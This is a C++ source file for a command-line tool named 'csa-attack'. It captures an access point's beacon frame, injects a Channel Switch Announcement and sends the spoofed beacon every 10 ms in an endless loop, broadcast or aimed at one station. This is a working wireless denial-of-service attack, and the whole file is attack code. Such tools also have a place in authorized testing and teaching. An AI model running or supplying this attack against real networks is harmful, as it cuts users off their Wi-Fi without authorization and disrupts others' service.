#include <iostream>
#include <string>
#include <vector>
#include "pcap_handler.h"
#include "csa_attack.h"
#include <unistd.h>
#include <cstdio>
#include <cstdint>

static bool parseMac(const std::string &macStr, uint8_t out[6]) {
    unsigned int values[6];
    if (sscanf(macStr.c_str(), "%x:%x:%x:%x:%x:%x",
               &values[0], &values[1], &values[2],
               &values[3], &values[4], &values[5]) != 6) {
        return false;
    }
    for (int i = 0; i < 6; ++i) {
        if (values[i] > 0xFF) return false;
        out[i] = static_cast<uint8_t>(values[i]);
    }
    return true;
}

static std::string formatMac(const uint8_t mac[6]) {
    char buf[18];
    std::snprintf(buf, sizeof(buf), "%02x:%02x:%02x:%02x:%02x:%02x",
                  mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return std::string(buf);
}

int main(int argc, char* argv[]) {
    if (argc != 3 && argc != 4) {
        std::cerr << "Usage: " << (argc > 0 ? argv[0] : "csa-attack")
                  << " <interface> <ap_mac> [<station_mac>]" << std::endl;
        return 1;
    }

    std::string interface = argv[1];
    std::string apMacStr = argv[2];
    std::string stationMacStr;
    bool unicast = false;
    uint8_t stationMac[6];

    if (argc == 4) {
        stationMacStr = argv[3];
        if (!parseMac(stationMacStr, stationMac)) {
            std::cerr << "Invalid station MAC address format." << std::endl;
            return 1;
        }
        unicast = true;
    }

    uint8_t apMacBytes[6];
    if (!parseMac(apMacStr, apMacBytes)) {
        std::cerr << "Invalid AP MAC address format." << std::endl;
        return 1;
    }
    std::string apMacNormalized = formatMac(apMacBytes);

    PcapHandler pcap;
    if (!pcap.open(interface)) {
        std::cerr << "Failed to open interface " << interface 
                  << ": " << pcap.getLastError() << std::endl;
        return 1;
    }

    std::vector<uint8_t> beacon = pcap.captureBeacon(apMacNormalized);
    if (beacon.empty()) {
        std::cerr << "Failed to capture beacon frame: " 
                  << pcap.getLastError() << std::endl;
        return 1;
    }

    CSAAttack::removeFCS(beacon);

    uint8_t newChannel = CSAAttack::getNewChannelFromBeacon(beacon);
    std::cout << "계산된 새 채널 번호: " << (int)newChannel << std::endl;

    CSAAttack::insertCSA(beacon, newChannel, 0x03);

    if (unicast) {
        CSAAttack::setUnicastDestination(beacon, stationMac);
    }

    if (unicast) {
        std::cout << "Starting CSA attack: sending spoofed CSA beacon frames from AP " 
                  << apMacNormalized << " to station " << stationMacStr << std::endl;
    } else {
        std::cout << "Starting CSA attack: sending spoofed CSA beacon frames for AP " 
                  << apMacNormalized << " (broadcast)" << std::endl;
    }

    while (true) {
        if (!pcap.sendPacket(beacon)) {
            std::cerr << "Error sending packet: " << pcap.getLastError() << std::endl;
            return 1;
        }
        usleep(10000); // 10ms
    }

    return 0;
}
